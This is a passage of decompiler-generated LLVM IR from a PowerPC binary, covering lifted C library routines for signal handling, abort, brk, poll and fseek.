  br i1 %v3_100091ec, label %dec_label_pc_1000922c, label %dec_label_pc_1000920c

dec_label_pc_1000920c:                            ; preds = %entry
  %v2_1000920c = load i32, i32* %arg2, align 4
  store i32 %v2_1000920c, i32* %r0.global-to-local, align 4
  store i32 268472856, i32* @lr, align 4
  %v0_10009214 = call i32 @memcpy()
  %v0_10009218 = load i32, i32* @r31, align 4
  %v1_10009218 = add i32 %v0_10009218, 132
  %v2_10009218 = inttoptr i32 %v1_10009218 to i32*
  %v3_10009218 = load i32, i32* %v2_10009218, align 4
  store i32 %v3_10009218, i32* %r0.global-to-local, align 4
  %v1_10009224 = add i32 %v0_10009218, 136
  %v2_10009224 = inttoptr i32 %v1_10009224 to i32*
  %v3_10009224 = load i32, i32* %v2_10009224, align 4
  store i32 %v3_10009224, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000922c

dec_label_pc_1000922c:                            ; preds = %entry, %dec_label_pc_1000920c
  store i32 268472908, i32* @lr, align 4
  %v0_10009248 = call i32 @__syscall_rt_sigaction()
  %v0_1000924c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000924c = icmp eq i32 %v0_1000924c, 0
  store i32 %v0_10009248, i32* @r31, align 4
  br i1 %v3_1000924c, label %dec_label_pc_10009288, label %dec_label_pc_1000925c

dec_label_pc_1000925c:                            ; preds = %dec_label_pc_1000922c
  %v1_10009254 = icmp slt i32 %v0_10009248, 0
  %v1_1000925c = add i32 %v0_1000924c, 4
  store i32 %v1_1000925c, i32* @r3, align 4
  %v2_10009260 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_10009260, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10009254, label %dec_label_pc_10009288, label %dec_label_pc_1000926c

dec_label_pc_1000926c:                            ; preds = %dec_label_pc_1000925c
  %v3_1000926c = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000926c, i32* %r0.global-to-local, align 4
  %v2_10009270 = inttoptr i32 %v0_1000924c to i32*
  store i32 %v3_1000926c, i32* %v2_10009270, align 4
  store i32 268472952, i32* @lr, align 4
  %v0_10009274 = call i32 @memcpy()
  %v1_10009280 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009280 = add i32 %v1_10009280, 136
  %v3_10009280 = inttoptr i32 %v2_10009280 to i32*
  %v0_10009284 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009284 = load i32, i32* %r30.global-to-local, align 4
  %v2_10009284 = add i32 %v1_10009284, 132
  %v3_10009284 = inttoptr i32 %v2_10009284 to i32*
  store i32 %v0_10009284, i32* %v3_10009284, align 4
  %v0_1000928c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009288

dec_label_pc_10009288:                            ; preds = %dec_label_pc_1000925c, %dec_label_pc_1000922c, %dec_label_pc_1000926c
  %v0_1000928c = phi i32 [ %v0_10009248, %dec_label_pc_1000925c ], [ %v0_10009248, %dec_label_pc_1000922c ], [ %v0_1000928c.pre, %dec_label_pc_1000926c ]
  store i32 %v0_100091e0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000928c

; uselistorder directives
  uselistorder i32 %v0_10009248, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10009288, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000922c, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_100092a8 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_100092a8, label %dec_label_pc_100092cc, label %dec_label_pc_100092bc

dec_label_pc_100092bc:                            ; preds = %entry
  %tmp21 = icmp slt i32 %arg1, 1
  br i1 %tmp21, label %dec_label_pc_100092cc, label %dec_label_pc_100092c4

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_100092bc
  %tmp22 = icmp slt i32 %arg1, 65
  br i1 %tmp22, label %dec_label_pc_100092fc.lr.ph, label %dec_label_pc_100092cc

dec_label_pc_100092cc:                            ; preds = %dec_label_pc_100092c4, %dec_label_pc_100092bc, %entry
  %v0_100092cc = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100092d8 = inttoptr i32 %v0_100092cc to i32*
  store i32 22, i32* %v2_100092d8, align 4
  %v0_1000936c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009368

dec_label_pc_100092fc.lr.ph:                      ; preds = %dec_label_pc_100092c4
  %v2_100092ec = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100092ec, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_100092fc23 = add i32 %v2_100092ec, 128
  %v3_100092fc24 = inttoptr i32 %v2_100092fc23 to i32*
  store i32 0, i32* %v3_100092fc24, align 4
  %v0_1000930025 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000930026 = add i32 %v0_1000930025, -1
  store i32 %v1_1000930026, i32* %r11.global-to-local, align 4
  %v1_1000930427 = mul i32 %v1_1000930026, 4
  %v1_1000930828 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000930829 = add i32 %v1_1000930828, %v1_1000930427
  store i32 %v2_1000930829, i32* %r9.global-to-local, align 4
  %v0_1000930c30 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000930c31 = add i32 %v0_1000930c30, -1
  store i32 %v1_1000930c31, i32* %ctr.global-to-local, align 4
  %v2_1000930c32 = icmp eq i32 %v1_1000930c31, 0
  br i1 %v2_1000930c32, label %dec_label_pc_10009310, label %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge

dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge: ; preds = %dec_label_pc_100092fc.lr.ph, %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge
  %v2_1000930833 = phi i32 [ %v2_10009308, %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge ], [ %v2_1000930829, %dec_label_pc_100092fc.lr.ph ]
  %v0_100092fc.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_100092fc = add i32 %v2_1000930833, 4
  %v3_100092fc = inttoptr i32 %v2_100092fc to i32*
  store i32 %v0_100092fc.pre, i32* %v3_100092fc, align 4
  %v0_10009300 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009300 = add i32 %v0_10009300, -1
  store i32 %v1_10009300, i32* %r11.global-to-local, align 4
  %v1_10009304 = mul i32 %v1_10009300, 4
  %v1_10009308 = load i32, i32* %r8.global-to-local, align 4
  %v2_10009308 = add i32 %v1_10009308, %v1_10009304
  store i32 %v2_10009308, i32* %r9.global-to-local, align 4
  %v0_1000930c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000930c = add i32 %v0_1000930c, -1
  store i32 %v1_1000930c, i32* %ctr.global-to-local, align 4
  %v2_1000930c = icmp eq i32 %v1_1000930c, 0
  br i1 %v2_1000930c, label %dec_label_pc_10009310, label %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge

dec_label_pc_10009310:                            ; preds = %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge, %dec_label_pc_100092fc.lr.ph
  %v2_10009308.lcssa = phi i32 [ %v2_1000930829, %dec_label_pc_100092fc.lr.ph ], [ %v2_10009308, %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge ]
  %v0_10009314.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_10009310 = ptrtoint i32* %stack_var_-292 to i32
  %v3_10009318 = call i32 @__sigaddset(i32 %v2_10009310, i32 %v0_10009314.pre, i32 %v2_10009308.lcssa)
  %v1_1000931c = icmp slt i32 %v3_10009318, 0
  br i1 %v1_1000931c, label %dec_label_pc_10009364, label %dec_label_pc_10009324

dec_label_pc_10009324:                            ; preds = %dec_label_pc_10009310
  %v0_10009328 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009330 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1001ff10.459 to i32), i32 %v0_10009328)
  %v2_1000933c = ptrtoint i32* %stack_var_-156 to i32
  store i32 268473172, i32* @lr, align 4
  %v4_10009350 = call i32 @__libc_sigaction(i32 %v0_10009328, i32* nonnull %stack_var_-296, i32 %v2_1000933c)
  %v1_10009354 = icmp slt i32 %v4_10009350, 0
  br i1 %v1_10009354, label %dec_label_pc_10009364, label %dec_label_pc_1000935c

dec_label_pc_1000935c:                            ; preds = %dec_label_pc_10009324
  %v3_1000935c = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000935c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009368

dec_label_pc_10009364:                            ; preds = %dec_label_pc_10009324, %dec_label_pc_10009310
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009368

dec_label_pc_10009368:                            ; preds = %dec_label_pc_1000935c, %dec_label_pc_100092cc, %dec_label_pc_10009364
  %v0_1000936c = phi i32 [ %v3_1000935c, %dec_label_pc_1000935c ], [ %v0_1000936c.pre, %dec_label_pc_100092cc ], [ -1, %dec_label_pc_10009364 ]
  ret i32 %v0_1000936c

; uselistorder directives
  uselistorder i32 %v1_1000930c, { 1, 0 }
  uselistorder i32 %v2_10009308, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009368, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100092fc.dec_label_pc_100092fc_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10009380 = add i32 %arg2, -1
  %v1_10009384 = call i32 @__asm_rlwinm(i32 %v1_10009380, i32 29, i32 3, i32 29)
  %v1_10009388 = urem i32 %v1_10009380, 32
  %v2_1000938c = add i32 %v1_10009384, %arg1
  %v3_1000938c = inttoptr i32 %v2_1000938c to i32*
  %v4_1000938c = load i32, i32* %v3_1000938c, align 4
  %v3_10009394 = shl i32 1, %v1_10009388
  %v2_10009398 = and i32 %v4_1000938c, %v3_10009394
  %v2_1000939c = icmp ne i32 %v2_10009398, 0
  %v5_100093a0 = zext i1 %v2_1000939c to i32
  ret i32 %v5_100093a0
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_100093a8 = add i32 %arg2, -1
  %v1_100093b0 = call i32 @__asm_rlwinm(i32 %v1_100093a8, i32 29, i32 3, i32 29)
  %v1_100093b4 = urem i32 %v1_100093a8, 32
  %v2_100093b8 = add i32 %v1_100093b0, %arg1
  %v3_100093b8 = inttoptr i32 %v2_100093b8 to i32*
  %v4_100093b8 = load i32, i32* %v3_100093b8, align 4
  %v3_100093bc = shl i32 1, %v1_100093b4
  %v2_100093c0 = or i32 %v3_100093bc, %v4_100093b8
  store i32 %v2_100093c0, i32* %v3_100093b8, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_100093d0 = add i32 %arg2, -1
  %v1_100093d8 = call i32 @__asm_rlwinm(i32 %v1_100093d0, i32 29, i32 3, i32 29)
  %v1_100093dc = urem i32 %v1_100093d0, 32
  %v2_100093e0 = add i32 %v1_100093d8, %arg1
  %v3_100093e0 = inttoptr i32 %v2_100093e0 to i32*
  %v4_100093e0 = load i32, i32* %v3_100093e0, align 4
  %v3_100093e4 = shl i32 -2, %v1_100093dc
  %v4_100093e4 = sub nsw i32 32, %v1_100093dc
  %v5_100093e4 = lshr i32 -2, %v4_100093e4
  %v6_100093e4 = or i32 %v5_100093e4, %v3_100093e4
  %v2_100093e8 = and i32 %v6_100093e4, %v4_100093e0
  store i32 %v2_100093e8, i32* %v3_100093e0, align 4
  ret i32 0
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000942c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v2_1000940c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000940c, i32* %r29.global-to-local, align 4
  %v0_10009414 = call i32 @__pthread_return_0()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000943034 = add i32 %v2_1000940c, 124
  %v4_1000943035 = inttoptr i32 %v3_1000943034 to i32*
  store i32 0, i32* %v4_1000943035, align 4
  %v0_1000943436 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000943437 = add i32 %v0_1000943436, -1
  store i32 %v1_1000943437, i32* %r9.global-to-local, align 4
  %v0_1000943838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000943839 = add i32 %v0_1000943838, -1
  store i32 %v1_1000943839, i32* %ctr.global-to-local, align 4
  %v2_1000943840 = icmp eq i32 %v1_1000943839, 0
  br i1 %v2_1000943840, label %dec_label_pc_1000943c, label %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge

dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge: ; preds = %dec_label_pc_1000942c.lr.ph, %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge
  %v1_1000943441 = phi i32 [ %v1_10009434, %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge ], [ %v1_1000943437, %dec_label_pc_1000942c.lr.ph ]
  %v0_10009430.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000942c = mul i32 %v1_1000943441, 4
  %v1_10009430 = load i32, i32* %r29.global-to-local, align 4
  %v3_10009430 = add i32 %v1_10009430, %v1_1000942c
  %v4_10009430 = inttoptr i32 %v3_10009430 to i32*
  store i32 %v0_10009430.pre, i32* %v4_10009430, align 4
  %v0_10009434 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009434 = add i32 %v0_10009434, -1
  store i32 %v1_10009434, i32* %r9.global-to-local, align 4
  %v0_10009438 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009438 = add i32 %v0_10009438, -1
  store i32 %v1_10009438, i32* %ctr.global-to-local, align 4
  %v2_10009438 = icmp eq i32 %v1_10009438, 0
  br i1 %v2_10009438, label %dec_label_pc_1000943c, label %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge

dec_label_pc_1000943c:                            ; preds = %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge, %dec_label_pc_1000942c.lr.ph
  %v1_10009434.lcssa = phi i32 [ %v1_1000943437, %dec_label_pc_1000942c.lr.ph ], [ %v1_10009434, %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge ]
  %v3_10009444 = call i32 @__sigaddset(i32 %v2_1000940c, i32 6, i32 %v1_10009434.lcssa)
  %v3_10009448 = icmp eq i32 %v3_10009444, 0
  br i1 %v3_10009448, label %dec_label_pc_10009450, label %dec_label_pc_10009460

dec_label_pc_10009450:                            ; preds = %dec_label_pc_1000943c
  store i32 268473440, i32* @lr, align 4
  %v3_1000945c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1000940c, i32 0)
  br label %dec_label_pc_10009460

dec_label_pc_10009460:                            ; preds = %dec_label_pc_1000943c, %dec_label_pc_10009450
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10009464 = load i32, i32* @global_var_1001d8a0.462, align 4
  %v3_10009468 = icmp eq i32 %v3_10009464, 0
  br i1 %v3_10009468, label %dec_label_pc_10009470, label %dec_label_pc_10009498

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009460
  store i32 1, i32* @global_var_1001d8a0.462, align 4
  br label %dec_label_pc_10009478

dec_label_pc_10009478:                            ; preds = %dec_label_pc_100094f4, %dec_label_pc_10009470
  store i32 ptrtoint (i32* @global_var_1001d7c0.460 to i32), i32* %r29.global-to-local, align 4
  %v0_10009484 = call i32 @__pthread_return_0()
  store i32 268473488, i32* @lr, align 4
  %v1_1000948c = call i32 @__raise(i32 6)
  %v0_10009494 = call i32 @__pthread_return_0()
  %v3_1000949c.pre = load i32, i32* @global_var_1001d8a0.462, align 4
  br label %dec_label_pc_10009498

dec_label_pc_10009498:                            ; preds = %dec_label_pc_10009460, %dec_label_pc_10009478
  %v0_10009510 = phi i32 [ %v3_10009464, %dec_label_pc_10009460 ], [ %v3_1000949c.pre, %dec_label_pc_10009478 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100094a0 = icmp eq i32 %v0_10009510, 1
  br i1 %v3_100094a0, label %dec_label_pc_100094e0.lr.ph, label %dec_label_pc_10009510

dec_label_pc_100094e0.lr.ph:                      ; preds = %dec_label_pc_10009498
  %v2_100094ac = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1001d8a0.462, align 4
  store i32 ptrtoint (i32* @global_var_100094c0.464 to i32), i32* @lr, align 4
  %v3_100094bc = call i32 @__GI_memset(i32 %v2_100094ac, i32 0, i32 140)
  store i32 %v2_1000940c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_100094e424 = add i32 %v2_1000940c, 124
  store i32 %v2_100094e424, i32* %r9.global-to-local, align 4
  %v2_100094e825 = add i32 %v2_1000940c, 256
  %v3_100094e826 = inttoptr i32 %v2_100094e825 to i32*
  store i32 -1, i32* %v3_100094e826, align 4
  %v0_100094ec27 = load i32, i32* %r11.global-to-local, align 4
  %v1_100094ec28 = add i32 %v0_100094ec27, -1
  store i32 %v1_100094ec28, i32* %r11.global-to-local, align 4
  %v0_100094f029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100094f030 = add i32 %v0_100094f029, -1
  store i32 %v1_100094f030, i32* %ctr.global-to-local, align 4
  %v2_100094f031 = icmp eq i32 %v1_100094f030, 0
  br i1 %v2_100094f031, label %dec_label_pc_100094f4, label %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge

dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge: ; preds = %dec_label_pc_100094e0.lr.ph, %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge
  %v1_100094ec32 = phi i32 [ %v1_100094ec, %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge ], [ %v1_100094ec28, %dec_label_pc_100094e0.lr.ph ]
  %v1_100094e4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_100094e8.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100094e0 = mul i32 %v1_100094ec32, 4
  %v2_100094e4 = add i32 %v1_100094e0, %v1_100094e4.pre
  store i32 %v2_100094e4, i32* %r9.global-to-local, align 4
  %v2_100094e8 = add i32 %v2_100094e4, 132
  %v3_100094e8 = inttoptr i32 %v2_100094e8 to i32*
  store i32 %v0_100094e8.pre, i32* %v3_100094e8, align 4
  %v0_100094ec = load i32, i32* %r11.global-to-local, align 4
  %v1_100094ec = add i32 %v0_100094ec, -1
  store i32 %v1_100094ec, i32* %r11.global-to-local, align 4
  %v0_100094f0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100094f0 = add i32 %v0_100094f0, -1
  store i32 %v1_100094f0, i32* %ctr.global-to-local, align 4
  %v2_100094f0 = icmp eq i32 %v1_100094f0, 0
  br i1 %v2_100094f0, label %dec_label_pc_100094f4, label %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge

dec_label_pc_100094f4:                            ; preds = %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge, %dec_label_pc_100094e0.lr.ph
  store i32 268473612, i32* @lr, align 4
  %v4_10009508 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10009478

dec_label_pc_10009510:                            ; preds = %dec_label_pc_10009498
  %v3_10009510 = icmp eq i32 %v0_10009510, 2
  br i1 %v3_10009510, label %dec_label_pc_10009518, label %dec_label_pc_10009524

dec_label_pc_10009518:                            ; preds = %dec_label_pc_10009510
  store i32 3, i32* @global_var_1001d8a0.462, align 4
  br label %dec_label_pc_10009524

dec_label_pc_10009524:                            ; preds = %dec_label_pc_10009510, %dec_label_pc_10009518
  %v3_10009524 = phi i32 [ %v0_10009510, %dec_label_pc_10009510 ], [ 3, %dec_label_pc_10009518 ]
  %v1_1000952c = icmp ne i32 %v3_10009524, 3
  call void @__pseudo_cond_branch(i1 %v1_1000952c, i32 268473664)
  store i32 4, i32* @global_var_1001d8a0.462, align 4
  %v1_1000953c = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000953c

; uselistorder directives
  uselistorder i32 %v1_100094f0, { 1, 0 }
  uselistorder i32 %v1_100094ec, { 1, 0 }
  uselistorder i32 %v1_10009438, { 1, 0 }
  uselistorder i32 %v1_10009434, { 0, 2, 1 }
  uselistorder i32 %v2_1000940c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_1001d8a0.462, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 26, 27, 20, 0, 21, 22, 1, 31, 3, 2, 12, 4, 23, 24, 15, 16, 17, 25, 28, 29, 30, 18, 19, 13, 5, 8, 6, 7, 14, 9, 10, 11 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 2, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__sigaddset, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009524, { 1, 0 }
  uselistorder label %dec_label_pc_100094e0.dec_label_pc_100094e0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009498, { 1, 0 }
  uselistorder label %dec_label_pc_10009460, { 1, 0 }
  uselistorder label %dec_label_pc_1000942c.dec_label_pc_1000942c_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10009548 = add i32 %arg1, 28
  %v2_10009548 = inttoptr i32 %v1_10009548 to i32*
  %v3_10009548 = load i32, i32* %v2_10009548, align 4
  store i32 %v3_10009548, i32* @global_var_1001d8a4.465, align 4
  %v1_10009558 = add i32 %arg1, 44
  %v2_10009558 = inttoptr i32 %v1_10009558 to i32*
  %v3_10009558 = load i32, i32* %v2_10009558, align 4
  store i32 %v3_10009558, i32* @global_var_1001d8a8.466, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10009570 = load i32, i32* @r3, align 4
  store i32 %v0_10009570, i32* @r29, align 4
  %v0_10009578 = call i32 @__errno_location()
  %v0_1000957c = load i32, i32* @r29, align 4
  %v2_1000957c = inttoptr i32 %v0_10009578 to i32*
  store i32 %v0_1000957c, i32* %v2_1000957c, align 4
  ret i32 -1
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1001d8ac.426, align 4
  %v0_100095c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_100095c0)
  store i32 12, i32* @r3, align 4
  %v0_100095c8 = call i32 @__syscall_error()
  ret i32 %v0_100095c8

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 1, 0 }
  uselistorder i32* @global_var_1001d8ac.426, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100095e4 = call i32 @__asm_mfcr()
  %v1_100095e8 = and i32 %v0_100095e4, 268435456
  %v3_100095e8 = icmp eq i32 %v1_100095e8, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_100095e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100095e8, label %dec_label_pc_10009600, label %dec_label_pc_100095f4

dec_label_pc_100095f4:                            ; preds = %entry
  %v0_100095f4 = call i32 @__errno_location()
  %v0_100095f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100095f8 = inttoptr i32 %v0_100095f4 to i32*
  store i32 %v0_100095f8, i32* %v2_100095f8, align 4
  br label %dec_label_pc_10009600

dec_label_pc_10009600:                            ; preds = %entry, %dec_label_pc_100095f4
  %v0_10009610 = phi i32 [ %v0_100095e4, %entry ], [ -1, %dec_label_pc_100095f4 ]
  ret i32 %v0_10009610

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_10009600, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000962c = call i32 @__asm_mfcr()
  %v1_10009630 = and i32 %v0_1000962c, 268435456
  %v3_10009630 = icmp eq i32 %v1_10009630, 0
  store i32 %v0_1000962c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009630, label %dec_label_pc_10009648, label %dec_label_pc_1000963c

dec_label_pc_1000963c:                            ; preds = %entry
  %v0_1000963c = call i32 @__errno_location()
  %v0_10009640 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009640 = inttoptr i32 %v0_1000963c to i32*
  store i32 %v0_10009640, i32* %v2_10009640, align 4
  br label %dec_label_pc_10009648

dec_label_pc_10009648:                            ; preds = %entry, %dec_label_pc_1000963c
  %v0_10009658 = phi i32 [ %v0_1000962c, %entry ], [ -1, %dec_label_pc_1000963c ]
  ret i32 %v0_10009658

; uselistorder directives
  uselistorder label %dec_label_pc_10009648, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000965c = load i32, i32* @r5, align 4
  store i32 %v0_1000965c, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10009664 = zext i1 %tmp to i32
  %v2_10009664 = ashr i32 %arg1, 31
  %v3_10009664 = and i32 %v2_10009664, -2
  %v4_10009664 = or i32 %v3_10009664, %v1_10009664
  %v3_10009668 = inttoptr i32 %v4_10009664 to i16*
  %v4_10009668 = call i32 @__GI_fseeko64(i16* %v3_10009668, i32 %arg1, i32 %v0_1000965c)
  ret i32 %v4_10009668

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10009670 = load i32, i32* @lr, align 4
  store i32 %v0_10009670, i32* %r0.global-to-local, align 4
  %v0_10009674 = load i32, i32* @r7, align 4
  store i32 %v0_10009674, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10009674, 3
  br i1 %tmp9, label %dec_label_pc_100096a8, label %dec_label_pc_10009694

dec_label_pc_10009694:                            ; preds = %entry
  %v0_10009694 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_100096a0 = inttoptr i32 %v0_10009694 to i32*
  store i32 22, i32* %v2_100096a0, align 4
  br label %dec_label_pc_10009770

dec_label_pc_100096a8:                            ; preds = %entry
  %v2_100096a8 = add i32 %tmp, 52
  %v3_100096a8 = inttoptr i32 %v2_100096a8 to i32*
  %v4_100096a8 = load i32, i32* %v3_100096a8, align 4
  store i32 %v4_100096a8, i32* @r28, align 4
  %v3_100096ac = icmp eq i32 %v4_100096a8, 0
  br i1 %v3_100096ac, label %dec_label_pc_100096b4, label %dec_label_pc_100096d4

dec_label_pc_100096b4:                            ; preds = %dec_label_pc_100096a8
  %v2_100096b4 = add i32 %tmp, 56
  store i32 %v2_100096b4, i32* @r29, align 4
  %v2_100096bc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100096bc, i32* @r3, align 4
  %v0_100096c8 = call i32 @__pthread_return_void()
  %v0_100096d0 = call i32 @__pthread_return_0()
  %v0_100096d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100096d4

